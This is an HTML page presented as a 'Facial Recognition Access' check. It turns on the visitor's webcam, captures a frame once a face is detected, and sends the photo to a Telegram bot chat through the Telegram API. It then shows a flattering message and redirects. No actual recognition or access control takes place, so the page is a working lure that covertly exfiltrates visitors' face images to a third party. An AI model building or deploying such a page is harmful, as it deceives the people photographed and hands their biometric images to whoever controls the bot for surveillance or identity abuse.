<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facial Recognition</title>
    <script src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
    <style>
        body {
            text-align: center;
            font-family: Arial, sans-serif;
        }
        video {
            border: 2px solid black;
            margin-top: 20px;
            width: 100%;
            max-width: 640px;
            height: auto;
        }
        canvas {
            width: 100%;
            max-width: 640px;
            height: auto;
            display: none;
        }
        #message {
            font-size: 24px;
            font-weight: bold;
            color: #ff4081;
            display: none;
        }
    </style>
</head>
<body>
    <h1>Facial Recognition Access</h1>
    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>
    <p id="message"></p>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const message = document.getElementById('message');
        const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN';
        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';

        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                await loadModels();
                detectFace();
            } catch (err) {
                console.error("Error accessing camera: ", err);
            }
        }

        async function loadModels() {
            await faceapi.nets.tinyFaceDetector.loadFromUri('/models/');
        }

        async function detectFace() {
            setTimeout(async () => {
                if (typeof faceapi === 'undefined') {
                    console.error("face-api.js is not loaded correctly");
                    message.innerText = "Error loading face detection model.";
                    message.style.color = "red";
                    message.style.display = "block";
                    return;
                }
                
                const detections = await faceapi.detectSingleFace(video, new faceapi.TinyFaceDetectorOptions());
                if (!detections) {
                    video.style.display = "none";
                    message.innerText = "Error detecting face.";
                    message.style.color = "red";
                    message.style.display = "block";
                    setTimeout(() => { window.location.reload(); }, 3000);
                    return;
                }
                captureAndSend();
            }, 5000);
        }

        function captureAndSend() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(blob => {
                let formData = new FormData();
                formData.append("chat_id", TELEGRAM_CHAT_ID);
                formData.append("photo", blob, "face.jpg");
                
                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: "POST",
                    body: formData
                }).then(() => {
                    video.style.display = "none";
                    message.innerText = "You look handsome/beautiful today!";
                    message.style.display = "block";
                    setTimeout(() => { window.location.href = "nextpage.html"; }, 3000);
                }).catch(err => console.error("Error sending photo: ", err));
            }, 'image/jpeg');
        }
        
        window.onload = () => {
            if (typeof faceapi === 'undefined') {
                console.error("face-api.js failed to load");
            } else {
                startCamera();
            }
        };
    </script>
</body>
</html>
